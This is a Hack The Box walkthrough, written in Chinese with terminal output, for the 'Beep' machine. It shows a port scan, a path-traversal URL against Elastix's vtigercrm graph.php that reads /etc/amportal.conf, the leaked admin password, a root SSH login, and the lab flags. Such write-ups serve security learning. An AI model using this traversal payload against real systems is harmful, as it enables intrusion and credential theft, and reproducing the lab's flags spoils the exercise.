###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Beep
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.38.44 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.38.44:22
Open 10.129.38.44:25
Open 10.129.38.44:80
Open 10.129.38.44:110
Open 10.129.38.44:111
Open 10.129.38.44:143
Open 10.129.38.44:443
Open 10.129.38.44:3306
Open 10.129.38.44:4190
Open 10.129.38.44:4445
Open 10.129.38.44:4559
Open 10.129.38.44:5038
Open 10.129.38.44:10000
Open 10.129.38.44:857
Open 10.129.38.44:995
Open 10.129.38.44:993

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?      syn-ack
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       syn-ack Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.129.38.44/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp   open  pop3?      syn-ack
111/tcp   open  rpcbind    syn-ack 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            854/udp   status
|_  100024  1            857/tcp   status
143/tcp   open  imap?      syn-ack
443/tcp   open  ssl/http   syn-ack Apache httpd 2.2.3 ((CentOS))
|_ssl-date: 2024-08-27T09:01:38+00:00; +12s from scanner time.
|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
857/tcp   open  status     syn-ack 1 (RPC #100024)
993/tcp   open  imaps?     syn-ack
995/tcp   open  pop3s?     syn-ack
3306/tcp  open  mysql?     syn-ack
4190/tcp  open  sieve?     syn-ack
4445/tcp  open  upnotifyp? syn-ack
4559/tcp  open  hylafax?   syn-ack
5038/tcp  open  asterisk   syn-ack Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 2E24CCCFC15E89AACDD3B53DB59E6C68
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.0.1
```

因為`firefox`打不開頁面，要先去`about:config`把`security.tls.version.min`改成`1`才能前往，可以看到`Elastix`
google搜尋[edb-37637](https://www.exploit-db.com/exploits/37637)，前往
`https://10.129.38.44/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`

```
...
ARI_ADMIN_PASSWORD=jEhdIekWmdjE 
...
```

嘗試ssh登入root，發現可以登，在`/home/fanis`可得user.txt，在root可得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.129.38.44

root@10.129.38.44's password: jEhdIekWmdjE 

[root@beep fanis]# cat user.txt
832e40b743eb99236608b200513752b4

[root@beep ~]# cat root.txt
78d26957aa43e52310a71480536cecbb
```